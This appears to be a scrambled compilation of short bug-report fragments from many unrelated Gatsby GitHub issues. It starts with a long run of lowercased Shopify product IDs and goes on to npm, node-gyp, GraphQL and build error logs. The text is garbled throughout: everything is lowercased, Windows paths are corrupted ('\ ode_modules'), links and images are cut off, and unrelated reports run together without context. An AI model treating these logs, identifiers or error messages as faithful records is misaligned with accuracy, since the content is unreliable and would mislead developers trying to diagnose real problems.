__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1ntc5mzy2odkyntu=,shopify__product__z2lkoi8vc 2hvcglmes9qcm9kdwn0lzq1mze1mze4nzq0mdc=,shopify__product__z2lkoi8vc2hvcglmes9q cm9kdwn0lzq1ndcznda0njgzmjc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq 1ntc5mjiynzezmzu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzmwodyymzgwmj m5nw==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2mziwotg5njm1ntk=,shop ify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1mtcxotqzndm=,shopify__produc t__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mju2mze2mzu1ntk=,shopify__product__z2lkoi8v c2hvcglmes9qcm9kdwn0lzqzotq1ndgxnjy3ntk=,shopify__product__z2lkoi8vc2hvcglmes9 qcm9kdwn0lzq1mze0nzi1otcwotu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lz qzmju4ndmznzawodc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1ntc5mza0m za1njc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1mdc1nja1nte=,sho pify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1mdu1nje3mdm=,shopify__produ ct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2mzkymte3ndk0nzk=,shopify__product__z2lkoi8 vc2hvcglmes9qcm9kdwn0lzmwodyxnzu3njq3nw==,shopify__product__z2lkoi8vc2hvcglmes 9qcm9kdwn0lzq2ndywndmyntq4odc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0l zq1mze0nzexntuzmdm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2ntmy nzk4ndc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2ndmwntyymze=,sh opify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mjkwotcwnjm=,shopify__prod uct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqzotq1ndg1ntk5nzu=,shopify__product__z2lkoi 8vc2hvcglmes9qcm9kdwn0lzq1ntc5mjc4nzq2njm=,shopify__product__z2lkoi8vc2hvcglme s9qcm9kdwn0lzq1nju3mde2mjm5mte=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0 lzq1mze2mzc1nteymdc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqzmju4nze 2mtyxmdm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze0nzc4nzi3ndm=,s hopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqzmju5otu2nzu3nte=,shopify__pro duct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze0oda3odkwotu=,shopify__product__z2lko i8vc2hvcglmes9qcm9kdwn0lzq2mziwnzuynziyotu=,shopify__product__z2lkoi8vc2hvcglm es9qcm9kdwn0lzq1mze1odewmjy0mdc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn 0lzqzotq2mji3nzk0otu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2ndu1mt uxnju3otk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2mziyntkxotkwnzk=, shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqzotq1ndqwmduymjm=,shopify__pr oduct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2ndiwmzmwmdg3ndm=,shopify__product__z2lk oi8vc2hvcglmes9qcm9kdwn0lzq2mziwnzi5mti5otk=,shopify__product__z2lkoi8vc2hvcgl mes9qcm9kdwn0lzq1mze1odezntqwodc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdw n0lzq1mze1oda3njqynjm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2ndu1m dg4nde1nzu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mta3mduznti4mdc= ,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2ndiwntq0mzkwmtu=,shopify__p roduct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mzuzntiwmzmzodm=,shopify__product__z2l koi8vc2hvcglmes9qcm9kdwn0lzq1mze1ntaxmjyxodm=,shopify__product__z2lkoi8vc2hvcg lmes9qcm9kdwn0lzq1mze1ndg0mjiyndc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kd wn0lzq1mze1mjk4mtawmjm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mta2 odq1nduxmjc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mta2otgzmdc2odc =,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2ndu1mta5nze0otu=,shopify__ product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mta2ote3ody4ntu=,shopify__product__z2 lkoi8vc2hvcglmes9qcm9kdwn0lzq2ndu1mdq1ndg5njc=,shopify__product__z2lkoi8vc2hvc glmes9qcm9kdwn0lzq2ndu1mdizodyynzk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9k dwn0lzq2ndiwnjq0otg3ote=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2ndi wndkynje2nze=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2mzkymjkzmtmxmj c=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2mzkymje2ndu0mtu=,shopify_ _product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1ndaynde1ndmynze=,shopify__product__z 2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2ntk0ndaymze=,shopify__product__z2lkoi8vc2hv cglmes9qcm9kdwn0lzq1mze2ntg4mtc2mzk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9 kdwn0lzq1mze2ntc2mzc5ote=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mz e2ntq3mje2mzk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2nduwodc4n dc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mzmwmjkymjm=,shopify __product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mtyymtkymzk=,shopify__product__ z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1ode0oduxntk=,shopify__product__z2lkoi8vc2h vcglmes9qcm9kdwn0lzq1mze1ntg3mtezotk=,shopify__product__z2lkoi8vc2hvcglmes9qcm 9kdwn0lzq1mze1nta3mtywmdc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1m ze1ndk1njkxmjc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1mza3njay otu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1mjgzmzu0njm=,shopif y__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1mjaxndm0njm=,shopify__product_ _z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1mte1ntgyndc=,shopify__product__z2lkoi8vc2 hvcglmes9qcm9kdwn0lzq1mze1mdk2mjq5mzu=,shopify__product__z2lkoi8vc2hvcglmes9qc m9kdwn0lzq1mze0odcznzu0njm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1 mze0odyynjeznte=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze0oduwndg 5mzu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze0odqxoty5njc=,shopi fy__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze0odi5odq1nte=,shopify__product __z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze0ode5mdmymdc=,shopify__product__z2lkoi8vc 2hvcglmes9qcm9kdwn0lzqzmzgwmtc4mjg5njc=,shopify__product__z2lkoi8vc2hvcglmes9q cm9kdwn0lze0mtq0mzk0mzyzote=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq zmzgwmtqxntg5nte=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzm2otaymda3nj a2mq==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqynjk4otm1ntaxodm=,shop ify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzm4ntc2nzaynzuxnzu=,shopify__produc t__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq0mjy5mjm4mdi3mjc=,shopify__product__z2lkoi8v c2hvcglmes9qcm9kdwn0lzq0mjy4mjkynjcwndc=,shopify__product__z2lkoi8vc2hvcglmes9 qcm9kdwn0lzq0njkxmtm1mjaymze=".
error message:
the result of this staticquery could not be fetched
this is likely a bug in gatsby and if refreshing the page does not fix it, please open an issue in
error: the result of this staticquery could not be fetched
this is likely a bug in gatsby and if refreshing the page does not fix it, please open an issue in at usestaticquery ( ~main.846d47b2b5df26ed1d0b.bundle.js:28626:11) at reproduction ( at ~main.846d47b2b5df26ed1d0b.bundle.js:2952:21 at ~main.846d47b2b5df26ed1d0b.bundle.js:4255:16 at withsubscriptiontracking ( ~main.846d47b2b5df26ed1d0b.bundle.js:4283:16) at ~main.846d47b2b5df26ed1d0b.bundle.js:2952:21 at ~main.846d47b2b5df26ed1d0b.bundle.js:4254:14 at ~main.846d47b2b5df26ed1d0b.bundle.js:2980:20 at storyfn ( ~main.846d47b2b5df26ed1d0b.bundle.js:5367:30) at oh ( ~main.846d47b2b5df26ed1d0b.bundle.js:41118:146)
span \'triple-quoted-string\' seems to be messy, as result first string line is moved to the same line as """
whole triple-quoted-string span is marked for highlighting, i would expect that below lines are highligted(see /src/markdow-pages/test.md) - opening docstring: `"""` - first text line: this is a one line description of the bbue cda module.
![serve_mobile](
iframe (script execution) is only attached on first load, not on subsequent loads.
my custom resolver affects the results of unrelated queries.
you are redirected to "/p5/<image filename>" without the /again prefix, resulting in a 404.
mixed content in main chunk with common packages together with page modules.
`loading (staticquery)` is shown.
blank/white screens show and staticquery fails to resolve
error in installing gatsby plugin for netlify cms
here's the error log i got from the terminal: ```
npm err! code eperm
npm err! syscall unlink
npm err! path c:\\users\\user\\desktop\\mohd projects\\blogger\ ode_modules\\@emotion\\weak-memoize\\dist
npm err! errno -4048
npm err! error: eperm: operation not permitted, unlink 'c:\\users\\user\\desktop\\mohd projects\\blogger\ ode_modules\\@emotion\\weak-memoize\\dist'
npm err! [operationalerror: eperm: operation not permitted, unlink 'c:\\users\\user\\desktop\\mohd projects\\blogger\ ode_modules\\@emotion\\weak-memoize\\dist'] {
npm err! cause: [error: eperm: operation not permitted, unlink 'c:\\users\\user\\desktop\\mohd projects\\blogger\ ode_modules\\@emotion\\weak-memoize\\dist'] {
npm err! errno: -4048,
npm err! code: 'eperm',
npm err! syscall: 'unlink',
npm err! path: 'c:\\\\users\\\\user\\\\desktop\\\\mohd projects\\\\blogger\\\ ode_modules\\\\@emotion\\\\weak-memoize\\\\dist'
npm err! },
npm err! stack: "error: eperm: operation not permitted, unlink \'c:\\\\users\\\\user\\\\desktop\\\\mohd projects\\\\blogger\\\ ode_modules\\\\@emotion\\\\weak-memoize\\\\dist\'",
npm err! errno: -4048,
npm err! code: 'eperm',
npm err! syscall: 'unlink',
npm err! path: 'c:\\\\users\\\\user\\\\desktop\\\\mohd projects\\\\blogger\\\ ode_modules\\\\@emotion\\\\weak-memoize\\\\dist',
npm err! parent: 'blogger'
npm err! the operation was rejected by your operating system.
npm err! it's possible that the file was already in use (by a text editor or antivirus),
npm err! or that you lack permissions to access it.
npm err! if you believe this might be a permissions issue, please double-check the
npm err! permissions of the file and its containing directories, or try running
npm err! the command again as root/administrator.
the image in the wrapper reloads (looks like the component remains mounted, but the cache is reset when switching pages).
- images are not displayed
- link to source code not working
pages on the develop and build are different
styles on the build are all messed up
when the page loads for one moment i see the page with different styles (screen 1).
i have just mentioned index.js:14 error above, but the error occurs whenever i open a new page, the error disappears when i refresh the page.
gatsby throws #11321 error
`gatsby-source-shopify2` cannot fetch data
don't see images.
see terminal output above.
an obscure error message is emitted
just showing black screen
the first image is rendered
dictionary checks don't run on prs, so we miss linting issues
this is unsustainable.
the first build ends with an error pasted below
the second build runs successfully, but the linter reports some warnings on `no-useless-rename` rule
success createpages - 0.001s error #11328 a page component must export a react component for it to be valid
please make sure this file exports a react component:
only 269 results are returned -
every page renders like that: <img width="683" alt="screenshot 2020-07-21 at 17 56 51" src=" ">
if you use `img/demo.svg` in markdown then it get's converted to ` {generated-hash-values}/demo.svg`
this leads to image returning `4xx`
typeerror: cannot read property 'gatsbyremarkplugins' of undefined - gen-mdx.js:216 findimportsexports [my-website]/[gatsby-plugin-mdx]/utils/gen-mdx.js:216:36 - create-mdx-node.js:11 createmdxnode [my-website]/[gatsby-plugin-mdx]/utils/create-mdx-node.js:11:13 - gatsby-node.js:28 object.exports.oncreatenode /my-website/gatsby-node.js:28:31
error on build.
build fails.
the page reloads, but excludes the hash and just uses the pathname.
stack shown above.
eventually there is a memory leak
- i get an 404 in iframes
- the graphql endpoint is not available: 404 ### workaround - i can "restart" the app with going to where i see an deploy script and later the example website.
- now i can reload the docs and see the examples ### note - i think now you can not see the error because the app is restarted manually
- there is no error until the next time the app is suspended ### screenshots
<img width="755" alt="page 404" src=" "> <img width="435" alt="iframe source" src=" ">
the powershell showed me a mix of characters and the prompt mixed into it (see image below, i'm unable to clearly explain) ![image](
application remembers page scroll position of a previously visited page
this could come in handy if user clicks 'back' in the browser, but this would be unexpected if user clicks to navigate to a page via direct link.
the command is mia in production.
no statusbar is printed, except that everything seems to be ok.
the first click scrolls to the target element and updates the url but subsequent clicks only update the url without moving down the page.
generating ssr bundle failed error thrown
no problem with chrome.
in ie11 - windows 10, got a runtime error
![image](
if page that user navigated from had a `window.scrolly` value of 1500, the new page will also return 1500 when logging out `window.scrolly`
code blocks have a gray background and haven't been run through prism
the markup is one big string as opposed to wrapped fragments with css applied
![site showing broken code blocks on an algolia guide](
today it's taking 30 minutes and counting -- i don't know when this is going to end?
the whole application gets recreated/destroyed.
here is a sample of the output: building: c:\\program files\ odejs\ ode.exe c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\ ode-gyp\\bin\ ode-gyp.js rebuild --verbose --libsass_ext= --libsass_cflags= --libsass_ldflags= --libsass_library=
gyp info it worked if it ends with ok
gyp verb cli [
gyp verb cli 'c:\\\\program files\\\ odejs\\\ ode.exe',
gyp verb cli 'c:\\\\users\\\ kevi\\\\source\\\ epos\\\\gatsby-starter-business\\\ ode_modules\\\ ode-gyp\\\\bin\\\ ode-gyp.js',
gyp verb cli 'rebuild',
gyp verb cli '--verbose',
gyp verb cli '--libsass_ext=',
gyp verb cli '--libsass_cflags=',
gyp verb cli '--libsass_ldflags=',
gyp verb cli '--libsass_library='
gyp verb cli ]
gyp info using node-gyp@3.8.0
gyp info using node@14.4.0 | win32 | x64
gyp verb command rebuild []
gyp verb command clean []
gyp verb clean removing "build" directory
gyp verb command configure []
gyp verb check python checking for python executable "python2" in the path
gyp verb `which` failed error: not found: python2
gyp verb `which` failed at getnotfounderror (c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\which\\which.js:13:12)
gyp verb `which` failed at f (c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\which\\which.js:68:19)
gyp verb `which` failed at e (c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\which\\which.js:80:29)
gyp verb `which` failed at c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\which\\which.js:89:16
gyp verb `which` failed at c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\isexe\\index.js:42:5
gyp verb `which` failed at c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\isexe\\windows.js:36:5
gyp verb `which` failed at fsreqcallback.oncomplete (fs.js:175:21)
gyp verb `which` failed python2 error: not found: python2
gyp verb `which` failed at getnotfounderror (c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\which\\which.js:13:12)
gyp verb `which` failed at f (c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\which\\which.js:68:19)
gyp verb `which` failed at e (c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\which\\which.js:80:29)
gyp verb `which` failed at c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\which\\which.js:89:16
gyp verb `which` failed at c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\isexe\\index.js:42:5
gyp verb `which` failed at c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\\isexe\\windows.js:36:5
gyp verb `which` failed at fsreqcallback.oncomplete (fs.js:175:21) {
gyp verb `which` failed code: 'enoent'
gyp verb `which` failed }
gyp verb check python checking for python executable "python" in the path
gyp verb `which` succeeded python c:\\python27\\python.exe
gyp verb check python version `c:\\python27\\python.exe -c "import sys; print "2.7.17
gyp verb check python version .%s.%s" % sys.version_info[:3];"` returned: %j
gyp verb get node dir no --target version specified, falling back to host node version: 14.4.0
gyp verb command install [ '14.4.0' ]
gyp verb install input version string "14.4.0"
gyp verb install installing version: 14.4.0
gyp verb install --ensure was passed, so won't reinstall if already installed
gyp verb install version is already installed, need to check "installversion"
gyp verb got "installversion" 9
gyp verb needs "installversion" 9
gyp verb install version is good
gyp verb get node dir target node version installed: 14.4.0
gyp verb build dir attempting to create "build" dir: c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\ ode-sass\\build
gyp verb build dir "build" dir needed to be created? c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\ ode-sass\\build
gyp verb find vs2017 found installation at: c:\\program files (x86)\\microsoft visual studio\\2019\\community
gyp verb find vs2017 - found microsoft.visualstudio.component.vc.tools.x86.x64
gyp verb find vs2017 - found microsoft.visualstudio.vc.msbuild.base
gyp verb find vs2017 - found microsoft.visualstudio.component.windows10sdk.18362
gyp verb find vs2017 - using this installation with windows 10 sdk
gyp verb find vs2017 using installation: c:\\program files (x86)\\microsoft visual studio\\2019\\community
gyp verb build/config.gypi creating config file
gyp verb build/config.gypi writing out config file: c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\ ode-sass\\build\\config.gypi
gyp verb config.gypi checking for gypi file: c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\ ode-sass\\config.gypi
gyp verb common.gypi checking for gypi file: c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\ ode-sass\\common.gypi
gyp verb gyp gyp format was not specified; forcing "msvs"
gyp info spawn c:\\python27\\python.exe
gyp info spawn args [
gyp info spawn args 'c:\\\\users\\\ kevi\\\\source\\\ epos\\\\gatsby-starter-business\\\ ode_modules\\\ ode-gyp\\\\gyp\\\\gyp_main.py',
gyp info spawn args 'binding.gyp',
gyp info spawn args '-f',
gyp info spawn args 'msvs',
gyp info spawn args '-g',
gyp info spawn args 'msvs_version=2015',
gyp info spawn args '-i',
gyp info spawn args 'c:\\\\users\\\ kevi\\\\source\\\ epos\\\\gatsby-starter-business\\\ ode_modules\\\ ode-sass\\\\build\\\\config.gypi',
gyp info spawn args '-i',
gyp info spawn args 'c:\\\\users\\\ kevi\\\\source\\\ epos\\\\gatsby-starter-business\\\ ode_modules\\\ ode-gyp\\\\addon.gypi',
gyp info spawn args '-i',
gyp info spawn args 'c:\\\\users\\\ kevi\\\\.node-gyp\\\\14.4.0\\\\include\\\ ode\\\\common.gypi',
gyp info spawn args '-dlibrary=shared_library',
gyp info spawn args '-dvisibility=default',
gyp info spawn args '-dnode_root_dir=c:\\\\users\\\ kevi\\\\.node-gyp\\\\14.4.0',
gyp info spawn args '-dnode_gyp_dir=c:\\\\users\\\ kevi\\\\source\\\ epos\\\\gatsby-starter-business\\\ ode_modules\\\ ode-gyp',
gyp info spawn args '-dnode_lib_file=c:\\\\users\\\ kevi\\\\.node-gyp\\\\14.4.0\\\\<(target_arch)\\\ ode.lib',
gyp info spawn args '-dmodule_root_dir=c:\\\\users\\\ kevi\\\\source\\\ epos\\\\gatsby-starter-business\\\ ode_modules\\\ ode-sass',
gyp info spawn args '-dnode_engine=v8',
gyp info spawn args '--depth=.',
gyp info spawn args '--no-parallel',
gyp info spawn args '--generator-output',
gyp info spawn args 'c:\\\\users\\\ kevi\\\\source\\\ epos\\\\gatsby-starter-business\\\ ode_modules\\\ ode-sass\\\\build',
gyp info spawn args '-goutput_dir=.'
gyp info spawn args ]
gyp verb command build []
gyp verb build type release
gyp verb architecture x64
gyp verb node dev dir c:\\users\ kevi\\.node-gyp\\14.4.0
gyp verb found first solution file build/binding.sln
gyp verb using msbuild: c:\\program files (x86)\\microsoft visual studio\\2019\\community\\msbuild\\15.0\\bin\\msbuild.exe
gyp info spawn c:\\program files (x86)\\microsoft visual studio\\2019\\community\\msbuild\\15.0\\bin\\msbuild.exe
gyp info spawn args [
gyp info spawn args 'build/binding.sln',
gyp info spawn args '/nologo',
gyp info spawn args '/p:configuration=release;platform=x64'
gyp info spawn args ]
gyp err! uncaught exception
gyp err! stack error: spawn c:\\program files (x86)\\microsoft visual studio\\2019\\community\\msbuild\\15.0\\bin\\msbuild.exe enoent
gyp err! stack at process.childprocess._handle.onexit (internal/child_process.js:268:19)
gyp err! stack at onerrornt (internal/child_process.js:468:16)
gyp err! stack at processticksandrejections (internal/process/task_queues.js:84:21)
gyp err! system windows_nt 10.0.19041
gyp err! command "c:\\\\program files\\\ odejs\\\ ode.exe" "c:\\\\users\\\ kevi\\\\source\\\ epos\\\\gatsby-starter-business\\\ ode_modules\\\ ode-gyp\\\\bin\\\ ode-gyp.js" "rebuild" "--verbose" "--libsass_ext=" "--libsass_cflags=" "--libsass_ldflags=" "--libsass_library="
gyp err! cwd c:\\users\ kevi\\source\ epos\\gatsby-starter-business\ ode_modules\ ode-sass
gyp err! node -v v14.4.0
gyp err! node-gyp -v v3.8.0
gyp err! this is a bug in `node-gyp`.
error mentioned above
error #98123 generating ssr bundle failed
sometimes there are errors, and sometimes not; and i'm not sure why.
production build (only) fails because `@mdx-js/mdx` peer was < 1.5.9.
i am facing this issue while deploying [log](
the target page path was appended to the existing page path.
not able to complete building development bundle ```bash failed building development bundle
here is the error i get in my console, it luckily points directly to the problem in the gatsby navigate code: ``` 277 | 278 | var navigate = function navigate(to, options) {
> 279 | window.___navigate(rewritelinkpath(to, window.location.pathname), options); | ^ 280 | }; 281 | 282 | exports.navigate = navigate; webpackerror: referenceerror: window is not defined - index.js:279 node_modules/gatsby-link/index.js:279:1 - routeadmin.tsx:16 src/components/routes/routeadmin.tsx:16:15
build fails with error output from above.
blurred up image has a black background in base64 image
error as above.
however, on ie 11, when button is clicked, event is not triggered, so no state is updated
the following error was seen in the console: ```unhandled promise rejection error, page resources not found for /product
not rendering react```
console showed the following: ````
$ gatsby develop
success open and validate gatsby-configs - 0.027s
success load plugins - 1.550s
success onpreinit - 0.011s
success initialize cache - 0.011s
success copy gatsby files - 0.119s
success onprebootstrap - 0.011s
success createschemacustomization - 0.006s
success source and transform nodes - 0.069s
success building schema - 0.373s
success createpages - 0.001s
warn the plugin "dev-404-page" created a page with a component path that doesn\'t match the casing of the actual file
this may work locally, but will break on systems which are case-sensitive, e.g.
most ci/cd pipelines
page.component: "c:/src/gatsby-site/.cache/dev-404-page.js"
warn the plugin "gatsby-plugin-page-creator" created a page with a component path that doesn\'t match the casing of the actual file
this may work locally, but will break on systems which are
case-sensitive, e.g
most ci/cd pipelines
page.component: "c:/src/gatsby-site/src/pages/404.js"
warn the plugin "gatsby-plugin-page-creator" created a page with a component path that doesn\'t match the casing of the actual file
this may work locally, but will break on systems which are
case-sensitive, e.g
most ci/cd pipelines
page.component: "c:/src/gatsby-site/src/pages/index.js"
warn the plugin "gatsby-plugin-page-creator" created a page with a component path that doesn\'t match the casing of the actual file
this may work locally, but will break on systems which are
case-sensitive, e.g
most ci/cd pipelines
page.component: "c:/src/gatsby-site/src/pages/page-2.js"
warn the plugin "gatsby-plugin-page-creator" created a page with a component path that doesn\'t match the casing of the actual file
this may work locally, but will break on systems which are
case-sensitive, e.g
most ci/cd pipelines
page.component: "c:/src/gatsby-site/src/pages/using-typescript.tsx"
success createpagesstatefully - 0.131s
success updating schema - 0.034s
success onpreextractqueries - 0.001s error #85910 graphql multiple "root" queries found: "csrcgatsbysitesrcpagesusingtypescripttsx2907560070" and "csrcgatsbysitesrcpagesusingtypescripttsx2907560070".
only the first ("csrcgatsbysitesrcpagesusingtypescripttsx2907560070") will be registered
instead of: 1 | query csrcgatsbysitesrcpagesusingtypescripttsx2907560070 {
7 | query csrcgatsbysitesrcpagesusingtypescripttsx2907560070 {
11 | } do: 1 | query csrcgatsbysitesrcpagesusingtypescripttsx2907560070andcsrcgatsbysitesrcpagesusingtypescripttsx2907560070 {
8 | } this can happen when you use two page/static queries in one file
please combine those into one query.
if you're defining multiple components (each with a static query) in one file, you'll need to move each component to its own file
file: src\\pages\\using-typescript.tsx see our docs page for more info on this error: ```` when browsing to the browser showed the same graphql message that was in the console.
when the gatsby-theme package is linked with `yarn link`, the build fails with the error above
however, when the the same gatsby-theme package is downloaded straight from npm registry, the build succeeds.
error appears in cli as above.
gatsby dependency versions do not match, leading to various errors as it's unclear which package depends on what.
causes flicker showing not found page as shown here: ![peek 2020-07-08 17-40](
success rewriting compilation hashes - 0.004s
[ ] 0.000 s 0/1 0% building static html for pages
success building static html for pages - 0.322s - 1/1 3.11/s
nothing is shown: <img width="654" alt="a screenshot of the page url above showing an empty spot where an embed should be" src=" "> ## notes * going to some of the actual codesandbox seems to be fine?
styles are loading before my meta tags.
### see the vertical scroll section of vs code most of the above section is filled with styles, infact my og meta tags are the last ones, before my body starts
[![foo](
publicurl doesnt' exist
it doesn't seems like localfile was created if it's gif.
cors errors.
**$: error: enoent: no such file or directory, stat '/home/dipper/workspace/video_front_end/src/components/about/.#about.jsx'**
cannot configure, inability to forward the randomized port prevents server status communication
### problem location #l134-l140 should be fairly trivial to fix this by passing a value to `getrandomport()`, such as `program.statusport` or `process.env.gatsby_port_status`?
``` ~/documents/git/gatsby-cli/hello-world/tutorial-part-four (master)
$ gatsby develop error the above error occurred in the <storestateprovider> component: in storestateprovider in app react will try to recreate this component tree from scratch using the error boundary you provided, app
error warning: app: error boundaries should implement getderivedstatefromerror()
in that method, return a state update to display an error message or fallback ui
error unhandled rejection invalid hook call
hooks can only be called inside of the body of a function component
this could happen for one of the following reasons:
you might have mismatching versions of react and the renderer (such as react dom)
you might be breaking the rules of hooks
you might have more than one copy of react in the same app
see for tips about how to debug and fix this problem
error: invalid hook call
hooks can only be called inside of the body of a fun ction component
this could happen for one of the following reasons: 1
you might have mismatching versions of react and the renderer (such as reac t dom) 2
you might be breaking the rules of hooks 3
you might have more than one copy of react in the same app see for tips about how to debug and fix this problem
- react.development.js:1465 resolvedispatcher [tutorial-part-four]/[gatsby]/[react]/cjs/react.development.js:1465:13 - react.development.js:1496 usestate [tutorial-part-four]/[gatsby]/[react]/cjs/react.development.js:1496:20 - context.js:21 storestateprovider [tutorial-part-four]/[gatsby]/[gatsby-cli]/lib/reporter/loggers/ink/context
js:21:49 - react-reconciler.development.js:6036 renderwithhooks [tutorial-part-four]/[ink]/[react-reconciler]/cjs/react-reconciler.developme nt.js:6036:18 - react-reconciler.development.js:8570 mountindeterminatecomponent [tutorial-part-four]/[ink]/[react-reconciler]/cjs/react-reconciler.developme nt.js:8570:13 - react-reconciler.development.js:9938 beginwork$1 [tutorial-part-four]/[ink]/[react-reconciler]/cjs/react-reconciler.developme nt.js:9938:16 - react-reconciler.development.js:11563 object.invokeguardedcallbackimpl [tutorial-part-four]/[ink]/[react-reconciler]/cjs/react-reconciler.developme nt.js:11563:10 - react-reconciler.development.js:11740 invokeguardedcallback [tutorial-part-four]/[ink]/[react-reconciler]/cjs/react-reconciler.developme nt.js:11740:31 - react-reconciler.development.js:15778 beginwork$$1 [tutorial-part-four]/[ink]/[react-reconciler]/cjs/react-reconciler.developme nt.js:15778:7 - react-reconciler.development.js:14696 performunitofwork [tutorial-part-four]/[ink]/[react-reconciler]/cjs/react-reconciler.developme nt.js:14696:12 ```
the browser doesn't scroll to the section, it just changes hash in browser url address.
oncreatenode is called 5 times, with all nodes of type `sitepage`
cli hangs on "build manifest and related icons"
the body of the page appears glitchy and the footer is misplaced (for pages like about).
new page is loaded at the scrolled location of previous page
failed building static html for pages - 1.041s error #95313 building static html failed for path "/" see our docs page for more info on this error: 44 | } 45 | > 46 | if (cookies.get(\'username\').length !== 0) { | ^ 47 | return ( 48 | <layout> 49 | <div classname="maincontainer"> webpackerror: typeerror: cannot read property \'length\' of undefined - index.js:46 src/pages/index.js:46:29
gatsbygram
package manager selection dialog looks wrong.
the x_qlik_stability field value is always null.
error on build process
npm install errors.
i get the error copied above.
i got sthg below after updating things in contentful and then develop again
(embedded-asset-block) ```json
